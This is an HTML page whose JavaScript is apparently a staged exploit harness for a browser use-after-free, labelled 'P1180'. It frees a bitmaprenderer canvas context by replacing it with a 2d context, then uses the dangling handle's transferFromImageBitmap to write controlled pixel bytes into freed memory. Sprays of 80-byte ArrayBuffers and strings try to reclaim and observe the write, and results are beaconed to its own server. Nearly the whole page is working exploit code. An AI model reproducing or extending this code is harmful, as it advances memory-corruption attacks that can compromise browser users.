<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1180 BMR Dangle + transferFromImageBitmap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1180 — BMR DANGLE + transferFromImageBitmap (controlled-byte write)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1180-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1180: NEW UAF VARIANT — the bitmaprenderer (BMR) context dangle.
   The known trigger frees the 2d context. But calling getContext('2d')
   AFTER a BMR context exists REPLACES m_context — freeing the BMR
   (80B, community-measured) while our JS handle survives.
   transferFromImageBitmap on the dangling BMR writes CONTROLLED pixel
   bytes into freed memory. If the 80B slot is fastMalloc-reclaimable
   (not TZone), an AB(80) or string reclaim observes the write.
   Stages:
   0: feature detect (BMR ctx, transferFromImageBitmap, ImageBitmap)
   1: dangle test — BMR -> getContext('2d') -> transfer -> crash/survive
   2: AB(80) marker spray before transfer -> read ABs after (write?->)
   3: string reclaim ('A'.repeat(70), 80B class) -> transfer -> changed?
   4: AB(80) zero spray + 8x8 canvas (256B pixel payload)
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['detect','dangle','ab80','string','big'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1180_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1180_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/4 — '+STAGES[stage]);

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1180_stage');}catch(e){}
}else{

try{localStorage.setItem('p1180_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function done(rep){
  results.push({stage:stage,name:cur,result:rep});
  try{localStorage.setItem('p1180_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,700));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');
  setTimeout(function(){location.reload(true);},700);
}

function makeBitmap(){
  var cv=document.createElement('canvas');
  cv.width=8;cv.height=8;
  var cx=cv.getContext('2d');
  /* controlled pixel payload: distinctive byte pattern */
  var img=cx.createImageData(8,8);
  for(var i=0;i<img.data.length;i++)img.data[i]=(i*37+11)%256;
  cx.putImageData(img,0,0);
  return new Promise(function(res){
    createImageBitmap(cv).then(function(b){res(b);},function(e){B('BMP-ERR',String(e.message).slice(0,40));res(null);});
  });
}

function makeBMR(canvas){
  try{
    var ctx=canvas.getContext('bitmaprenderer');
    B('BMR-CTX',ctx?'ok':'null');
    return ctx;
  }catch(e){B('BMR-ERR',String(e.message).slice(0,40));return null;}
}

if(cur==='detect'){
  var cv=document.createElement('canvas');cv.width=8;cv.height=8;
  var bmr=makeBMR(cv);
  var hasT=(bmr&&typeof bmr.transferFromImageBitmap==='function');
  done('bmr='+(bmr?'yes':'no')+'|transfer='+hasT+'|createImageBitmap='+(typeof createImageBitmap==='function'));
}else if(cur==='dangle'){
  setPhase('BMR dangle + transfer');
  var cv2=document.createElement('canvas');cv2.width=8;cv2.height=8;
  var bmr2=makeBMR(cv2);
  if(!bmr2){done('no-bmr');}
  else{
    /* replace m_context: free the BMR while we hold bmr2 */
    var ctx2d=cv2.getContext('2d');
    B('REPLACED','2d='+(ctx2d?'ok':'null'));
    makeBitmap().then(function(bmp){
      if(!bmp){done('no-bmp');return;}
      var rep;
      try{
        bmr2.transferFromImageBitmap(bmp);
        rep='SURVIVED';
      }catch(e){rep='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
      done(rep);
    });
  }
}else if(cur==='ab80'){
  setPhase('AB(80) spray + transfer');
  var cv3=document.createElement('canvas');cv3.width=8;cv3.height=8;
  var bmr3=makeBMR(cv3);
  if(!bmr3){done('no-bmr');}
  else{
    cv3.getContext('2d'); /* free BMR */
    /* spray 200 AB(80) with marker */
    var abs=[];
    for(var i=0;i<200;i++){
      var ab=new ArrayBuffer(80);
      var dv=new DataView(ab);
      for(var o=0;o<80;o+=4)dv.setUint32(o,0xDEADBEEF,true);
      abs.push({ab:ab,dv:dv});
    }
    B('SPRAY','n=200');
    makeBitmap().then(function(bmp){
      if(!bmp){done('no-bmp');return;}
      var rep;
      try{bmr3.transferFromImageBitmap(bmp);rep='SURVIVED';}
      catch(e){rep='THROW:'+String(e.message).slice(0,30);}
      /* scan ABs for changes */
      var changed=0,sample='';
      for(var i2=0;i2<abs.length;i2++){
        for(var o2=0;o2<80;o2+=4){
          if(abs[i2].dv.getUint32(o2,true)!==0xDEADBEEF){
            changed++;
            if(!sample)sample='i'+i2+'@'+o2+'='+abs[i2].dv.getUint32(o2,true).toString(16);
            break;
          }
        }
      }
      done(rep+'|changed='+changed+'|'+sample);
    });
  }
}else if(cur==='string'){
  setPhase('string reclaim + transfer');
  var cv4=document.createElement('canvas');cv4.width=8;cv4.height=8;
  var bmr4=makeBMR(cv4);
  if(!bmr4){done('no-bmr');}
  else{
    cv4.getContext('2d');
    var str='A'.repeat(70); /* 70 chars -> StringImpl 16+70=86 -> 96B class? try 64B class: 48 chars */
    var str2='A'.repeat(48);
    B('STR','s1len='+str.length+'|s2len='+str2.length);
    makeBitmap().then(function(bmp){
      if(!bmp){done('no-bmp');return;}
      var rep;
      try{bmr4.transferFromImageBitmap(bmp);rep='SURVIVED';}
      catch(e){rep='THROW:'+String(e.message).slice(0,30);}
      var s1=0,s2=0;
      try{if(str.charCodeAt(0)!==65)s1=1;}catch(e){s1=2;}
      try{if(str2.charCodeAt(0)!==65)s2=1;}catch(e){s2=2;}
      done(rep+'|s1chg='+s1+'|s2chg='+s2);
    });
  }
}else if(cur==='big'){
  setPhase('AB(80) zero + 16x16 canvas');
  var cv5=document.createElement('canvas');cv5.width=16;cv5.height=16;
  var bmr5=makeBMR(cv5);
  if(!bmr5){done('no-bmr');}
  else{
    cv5.getContext('2d');
    var zabs=[];
    for(var i3=0;i3<300;i3++)zabs.push(new ArrayBuffer(80));
    B('ZSPRAY','n=300');
    makeBitmap().then(function(bmp){
      if(!bmp){done('no-bmp');return;}
      var rep;
      try{bmr5.transferFromImageBitmap(bmp);rep='SURVIVED';}
      catch(e){rep='THROW:'+String(e.message).slice(0,30);}
      var nz=0,samp='';
      for(var i4=0;i4<zabs.length;i4++){
        var dv5=new DataView(zabs[i4]);
        for(var o3=0;o3<80;o3+=4){
          if(dv5.getUint32(o3,true)!==0){
            nz++;
            if(!samp)samp='i'+i4+'@'+o3+'='+dv5.getUint32(o3,true).toString(16);
            break;
          }
        }
      }
      done(rep+'|nz='+nz+'|'+samp);
    });
  }
}

} /* stage machine */

/* auto-reload checker */
(function(){
  var cur='P1180-bmr-dangle';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
